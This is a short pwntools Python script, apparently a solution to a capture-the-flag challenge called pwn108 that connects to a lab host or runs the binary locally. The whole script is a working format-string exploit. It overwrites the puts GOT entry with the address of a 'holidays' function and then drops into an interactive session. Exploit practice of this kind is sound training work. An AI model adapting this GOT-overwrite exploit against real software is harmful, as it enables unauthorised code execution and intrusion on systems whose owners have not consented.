#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn108.pwn108", checksec=False)

REMOTE_IP = "10.10.2.126"
PORT = 9008

p = remote(REMOTE_IP, PORT) if args.REMOTE else process(binary.path)

payload = fmtstr_payload(10, {binary.got.puts : binary.sym.holidays})
p.sendlineafter(b"=[Your name]: ", b"foo")
p.sendlineafter(b"=[Your Reg No]: ", payload)
null = payload.find(b"\x00")
p.recvuntil(payload[null-3:null])
p.interactive()
